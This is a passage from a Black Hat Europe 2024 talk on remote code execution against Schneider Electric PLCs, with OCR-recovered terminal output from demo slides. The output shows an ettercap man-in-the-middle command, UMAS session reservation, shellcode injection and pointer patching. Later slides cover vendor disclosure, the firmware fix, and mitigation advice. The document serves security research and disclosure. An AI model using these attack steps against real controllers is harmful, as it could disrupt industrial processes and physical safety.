[40]+ Stopped sudo ettercap -T -i enx9cebe81llec58 -B enx207bd2b3ad0e Gi:
are/ettercap/mitm filter BH demo.ef -q
$f
Information Classification: General
```

## Slide 92

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
EUROPE 2024
Information Classification: General
/Documents/BlackHat_demo amirz@ubuntu: ~/Documents
Connected to PLC at 123.45.67.89
Checking PLC session status...
PLC session is not reserved
Establish reservation:
Read memory block...
Project application salt (base 64):
5WeRS1Ld0M1c=
Send PC Diffie-Hellman public key...
Received PLC Diffie-Hellman public key
/BlackHat_demo x amirz@ubuntu: ~/Documents/BlackHat_demo x
$ python3 umas_reserve.py
Send encrypted PC nonce and AES salt...
Received encrypted PLC nonce
Insert project password hash (base 64):
nirz@ubuntu: ~/Documents/BlackHat_demo
```

## Slide 93

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
QQ
black hat
EUROPE 2024
Reserved
amirz@ubuntu: ~/Documents/BlackHat_demo x amirz@ubuntu: ~/Documents/BlackHat_demo x amirz@ubuntu: ~/Documents/BlackHat_demo x amirz@ubuntu: ~-/Documents/BlackHat_demo
Send PC Diffie-Hellman public key...
Received PLC Diffie-Hellman public key
Send encrypted PC nonce and AES salt...
Received encrypted PLC nonce
Insert project password hash (base 64):
FNMEG6SpcMqpoEGX6rb7WePOVOuZVacYXENRMdaZe58=
Send authentication secret...
Reservation established successfully!
Reservation parameters:
4141414141414141414141414141414141414141414141414141414141414141
“y, nee63T1141e9ecb5c39e9ec813166177b8769a6323652aT0b7bb49127 F9et f5d
cp eSecsron Key.
jab
< Sending reserved 'GetPlcStatus' messages to keep the reserved session alive...
Information Classification: General
```

## Slide 94

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
EUROPE 2024
x amirz@ubuntu: ~/Documents/BlackHat_demo x amirz@ubuntu: -/Documents/BlackHat_demo x amirz@ubuntu: ~/Documents/BlackHat_demo x
$ python3 umas shellcode BH demo.py --shellcode shellcode |
sdCardLed BH demo.bin
Connected to PLC at 123.45.67.89
RCE based on modifying secondary pointer vulnerability
Choose an option:
1) Inject shellcode and patch the secondary pointer (reserved session is required)
2) Trigger the shellcode (using public UMAS message)
©) Exit
Information Classification: General
```

## Slide 95

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
EUROPE 2024
amirz@ubuntu: ~/Docume Blac amirz@ubuntu: ~/Documents/BlackHat_demo x amirz@ubuntu: ~/Documents/BlackHat_demo x amirz@ubuntu:~/Documents/BlackHat_demo x
Choose an opt :
pl) Inject shellcode and patch the secondary pointer (reserved session is required)
2) Trigger the shellcode (using public UMAS message)
0) Exit
1
Checking PLC session status...
PLC session is reserved:
Resever name: ATTACKER PC
Resever ID: 0x12345678
Insert session key:
4141414141414141414141414141414141414141414141414141414141414141
Insert PLC nonce:
aee63f1141e9ecb5c39e9ec8 F3f66F77b8769a6323652af0b7bb49127 F9ef F5d
Getting PLC ID...
PLC ID: 06010301
Injecting shellcode 'shellcode sdCardLed BH demo.bin' to safe storage memory area...
Shellcode injected successfully :)
Patching the secondary function pointer to the shellcode address
Information Classification: General
```

## Slide 96

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
QQ
black hat
EUROPE 2024
a sha Unreserved
amirz@ubuntu: ~/Documents/BlackHat_demo amirz@ubuntu: -/Documents/BlackHat_demo amirz@ubuntu: ~/Documents/BlackHat_demo x neha ta ments/BlackHat_demo x
Send encrypted PC nonce and AES salt...
Received encrypted PLC nonce
Insert project password hash (base 64):
NMEG6SpcMqpoEGX6rb7WePOVOuZVacYXENRMdaZe58=
Send authentication secret...
Reservation established successfully!
Reservation parameters:
4141414141414141414141414141414141414141414141414141414141414141
PLC nonce:
aee63f1141e9ecb5c39e9ec8F3 f66F77b8769a6323652afOb7/bb49127 f9ef f5d
Sending reserved 'GetPlcStatus' messages to keep the reserved session alive...
we
[5]+ Stopped python3 umas_reserve.py
Information Classification: General
```

## Slide 97

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
EUROPE 2024
amirz@ubuntu: ~/Documents/BlackHat_demo x amirz@ubuntu: ~/Documents/BlackHat_demo x amirz@ubuntu: ~/Documents/BlackHat_demo x Soo la sca x
>
Checking PLC session status...
PLC session is reserved:
Resever name: ATTACKER PC
Resever ID: 0x12345678
Insert session key:
ab
Insert PC nonce:
4141414141414141414141414141414141414141414141414141414141414141
Insert PLC nonce:
aee63f1141e9ecb5c39e9ec8 f3 f66f77b8769a6323652af Ob7bb49127 f9ef f5d
Getting PLC ID... .
PLC ID: 06010301 | Trigger our shellcode
Injecting shellcode 'shellcode sdCardLed BH demo.bin' to safe storage memory ar
Shellcode injected successfully :)
Patching the secondary function pointer to the shellcode address
Secondary pointer patched successfully :) y
Choose an option:
1) Inject shellcode and patch the secondary pointer (reserved session is required)
2) Trigger the shellcode (using public UMAS message) \wip-
0) Exit Snes
2
Information Classification: General
```

## Slide 98

Information Classification: General

#BHEU @BlackHatEvents

## Slide 99

Information Classification: General

#BHEU @BlackHatEvents

## Slide 100

# Reporting to Schneider Electric

Information Classification: General

#BHEU @BlackHatEvents

## Slide 101

#### **Reporting to Schneider Electric**

- We sincerely appreciate SE **collaboration** in **disclosing** these vulnerabilities.

- SE has released **firmware update 3.65** to address the **read-limit bypass** and the two **RCE** vulnerabilities, results in **blocking** the **attack chain** .

- SE recommends **mitigations** , including activation of **memory protection** on the controller, **blocking** unauthorized access to port **Modbus/TCP** , implementing a **VPN** etc.

- SE published public **security notifications** **<u>SEVD-2024-317-02</u>** and **<u>SEVD-2024317-03</u>** for further information.

Information Classification: General

#BHEU @BlackHatEvents

## Slide 102

Takeaways

Information Classification: General

#BHEU @BlackHatEvents

## Slide 103

#### **Takeaways for Vendors**

- **Constraints** of **current-generation PLCs** include limited **computing resources** and demand for **backward compatibility** .

- **Vendors** should continuously focus on **strengthening** security by **improving** their **protocols** to address potential **threats** , as highlighted in this talk.

- **Next-generation PLCs** should implement **State-of-the-Art** security **protocols** while **maintaining** as much **backward compatibility** as possible.

Information Classification: General

#BHEU @BlackHatEvents

## Slide 104

#### **Takeaways for Users**

- **Current-generation PLCs** were **not** designed to **protect** against **modern** cybersecurity **threats** from remote **internet** access.

- **Users** should **avoid** from **connecting** their PLCs directly to the **internet** .

- It is **essential** to regularly **update** the software and follow the security **recommendations** provided by the **vendor** .

Information Classification: General

#BHEU @BlackHatEvents

## Slide 105

#### **Takeaways for Users**

- **Current-generation PLCs** were **not** designed to **protect** against **modern** cybersecurity **threats** from remote **internet** access.

• **Users** should **avoid** from **connecting** their PLCs directly to the **internet** .

• It is  essential  to regularly  update  the software and follow the security
recommendations  provided by the  vendor .

Information Classification: General

#BHEU @BlackHatEvents

## Slide 106

# Talk materials will be available online

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
EUROPE 2024
Amir Zaltzman
+ Embedded security researcher
Motivation
+ With the rise of Industry 4.0 revolution,
Industrial devices, including current-
generation PLCs, are increasingly connected
to the internet.
+ PLC vendors are continuously enhancing their
proprietary security protocols while ensuring
operational compatibility.
- black hat DECEMBER 9-12,.2024
EUROPE 2024 e UNITED 4
FeATURES BUSINESS HALL ‘sPonsons:
Talk materials will be available online
Information Classification: General
```

## Slide 107

# Thank you for listening!

Information Classification: General

#BHEU @BlackHatEvents
